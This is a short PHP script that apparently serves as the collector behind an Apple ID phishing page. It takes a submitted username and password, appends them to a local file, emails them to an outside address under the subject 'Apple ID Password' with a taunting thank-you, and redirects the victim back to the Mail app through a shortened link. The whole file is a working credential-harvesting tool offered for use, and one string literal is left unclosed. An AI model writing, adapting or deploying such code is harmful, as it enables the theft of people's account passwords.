<?php
if(isset($_GET['modal-username']) && isset($_GET['modal-password'])) {
	$email = htmlspecialchars(stripslashes($_GET['modal-username']));
	$password = htmlspecialchars(stripslashes($_GET['modal-password']));
    $data = $email . '-' . $password . "\n";
    $ret = file_put_contents('./mydata.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error.');
    }
    else {
	    mail('b.schippers@nah.nl','Apple ID Password',"Thanks for your password! \n $data ¯\_(ツ)_/¯ \n https://github.com/Bassieee46/ios.injection);
	    header("Location: http://is.gd/9VOMTp"); //Redirects recipient from Safari back to Mail.app using message://dummy
	    die();
    }
}
else {
   die('No GET data to process. Thanks for trying.');
}
?>
